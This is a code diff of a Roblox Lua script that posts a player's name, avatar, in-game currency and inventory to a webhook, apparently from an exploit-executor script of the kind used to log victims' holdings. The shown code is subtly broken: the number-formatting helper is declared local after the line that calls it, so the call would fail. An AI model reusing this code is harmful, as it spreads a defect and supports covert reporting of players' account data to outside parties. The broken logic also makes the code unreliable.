@@ -87,7 +87,9 @@ local message = {
     avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=100&height=100&format=png",
     embeds = { {
         title = "**" .. player.Name .. "**",
-        description = "_ _\n**🪙 Sheckles  **: 213b\n_ _\n_ _\n**🎒 | Inventory**\n_ _\n_ _",
+        description = "_ _\n**🪙 Sheckles  **: " ..
+    (player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and formatNumberWithCommas(player.leaderstats.Sheckles.Value) or "Unknown") ..
+    "\n_ _\n_ _\n**🎒 | Inventory**\n_ _\n_ _",
         color = 2750290,
         fields = {
             {
@@ -131,4 +133,14 @@ if req then
     debug("✅ Webhook sent!")
 else
     debug("❌ HTTP requests not supported.")
+end
+
+local function formatNumberWithCommas(n)
+    local s = tostring(n)
+    local pattern = "(%d)(%d%d%d)$"
+    while true do
+        s, k = s:gsub("^(-?%d+)(%d%d%d)", '%1,%2')
+        if k == 0 then break end
+    end
+    return s
 end
